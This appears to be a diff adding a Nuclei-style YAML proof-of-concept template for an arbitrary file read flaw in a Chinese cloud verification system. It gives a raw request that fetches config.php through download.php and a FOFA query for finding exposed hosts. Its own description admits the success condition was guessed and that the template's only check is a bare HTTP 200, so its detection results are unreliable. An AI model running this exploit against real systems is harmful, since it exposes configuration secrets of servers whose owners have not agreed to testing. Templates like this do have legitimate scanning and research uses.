@@ -1,0 +1,27 @@
+id: poc-f5b7cb95ec209ba0306b
+info:
+  name: 极简云验证系统download存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f5b7cb95ec209ba0306b73649363f014
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f5b7cb95ec209ba0306b73649363f014
+    fofa: + fofa`body="/js/lib/slimscroll.js"`
+http:
+- raw:
+  - 'GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Content-Length: 0'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
